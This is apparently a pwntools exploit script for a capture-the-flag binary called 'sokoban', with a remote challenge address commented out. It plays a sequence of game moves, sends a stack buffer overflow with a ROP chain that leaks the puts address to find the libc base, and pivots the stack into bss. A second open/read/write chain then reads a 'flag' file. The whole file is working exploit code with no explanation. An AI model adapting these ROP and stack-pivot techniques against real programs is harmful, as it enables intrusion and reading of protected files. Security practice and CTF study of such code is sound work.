from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = remote('61.147.171.35',62070)  
p = process('./sokoban_patched')
elf = ELF('./sokoban')
libc = ELF('libc.so.6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
rdi = 0x400f63
ret = 0x40061e
csu_1 = 0x400f5a
csu_2 = 0x400f40
read_got = elf.got['read']
bss_addr = 0x602500
rbp = 0x400728
leave = 0x400834
prsi = 0x400f61
p.sendline(b'd')
p.sendline(b'd')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b's')
p.sendline(b's')
p.sendline(b'd')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b's')
p.sendline(b's')
p.sendline(b'a')
p.sendline(b's')
p.sendline(b's')
p.sendline(b'd')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b'w')
p.sendline(b's')
p.sendline(b's')
p.sendline(b's')
p.sendline(b'd')
p.sendline(b'w')
count = 25
for i in range(500):
    p.sendline(b'a')
    p.sendline(b'd')
p.sendline(b'w')

payload1 = flat([
    b'A' * 312,
    ret,
    rdi,
    puts_got,
    puts_plt,
    csu_1,
    0,
    1,
    read_got,
    0,
    bss_addr,
    0x200,
    csu_2,
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    rbp,
    bss_addr,
    leave
    ])
p.sendafter(b'Hero,Please leave your name:',payload1)
leak_data = p.recv(6)  
leak_puts = u64(leak_data.ljust(8, b'\x00'))
log.success(f"泄露的puts地址: {hex(leak_puts)}")
libc_base = leak_puts - libc.symbols['puts']
log.success(f"泄露的libc地址: {hex(libc_base)}")
libc.address = libc_base
prdx = libc_base + 0x1b96
syscall = libc_base + 0xd2625
prax = libc_base + 0x1b500
log.success(f"泄露的syscall地址: {hex(syscall)}")
payload2 = flat([
    b'deadbeef',
    prax, 2,
    rdi, bss_addr + 0x100,
    prsi, 0, 0,
    prdx, 0,
    syscall,

    rdi, 3,
    prsi, bss_addr + 0x200, 0,
    prdx, 0x50,
    libc.sym['read'],

    rdi, 1,
    prsi, bss_addr + 0x200, 0,
    prdx, 0x50,
    libc.sym['write'],
])
payload2 = payload2.ljust(0x100, b'\x00') + b'flag\x00'
p.send(payload2)
p.interactive()
